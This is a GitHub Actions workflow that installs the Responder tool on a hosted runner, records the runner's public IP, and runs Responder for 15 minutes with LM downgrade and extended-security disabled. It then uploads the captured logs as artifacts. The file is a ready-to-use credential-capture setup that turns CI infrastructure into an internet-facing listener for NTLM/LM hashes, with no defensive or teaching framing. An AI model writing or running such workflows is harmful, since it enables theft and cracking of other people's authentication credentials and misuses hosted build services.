name: responder-capture
on:
  workflow_dispatch:
jobs:
  responder:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: setup responder
        run: |
          sudo apt-get update -qq
          sudo python3 -m pip install --break-system-packages -q netifaces aioquic 2>&1 | tail -2 || true
          git clone --depth 1 https://github.com/lgandx/Responder.git /tmp/Responder
          if ! python3 -c "import aioquic" 2>/dev/null; then
            sed -i 's/^QUIC.*/QUIC = Off/' /tmp/Responder/Responder.conf
            echo "aioquic missing, QUIC disabled"
          else
            echo "aioquic ok"
          fi
          python3 -c "import netifaces; print('netifaces ok')"
          ls -la /tmp/Responder/Responder.py
      - name: report public ip
        run: |
          PUBIP=$(curl -s https://api.ipify.org)
          echo "PUBIP=$PUBIP"
          echo "PUBIP=$PUBIP" > /tmp/pubip.txt
      - name: run responder
        run: |
          cd /tmp/Responder
          (sudo python3 Responder.py -I eth0 -v -wF --lm --disable-ess > /tmp/responder.log 2>&1 &)
          sleep 8
          echo "--- ss 445 ---"
          sudo ss -lntp | grep 445 || echo "445 NOT LISTENING"
          echo "--- responder.log head ---"
          head -20 /tmp/responder.log || true
          echo "responder started; window=900s"
          sleep 900
          echo "window closed"
      - name: upload logs
        uses: actions/upload-artifact@v4
        with:
          name: responder-logs
          path: |
            /tmp/responder.log
            /tmp/pubip.txt
            /tmp/Responder/logs/
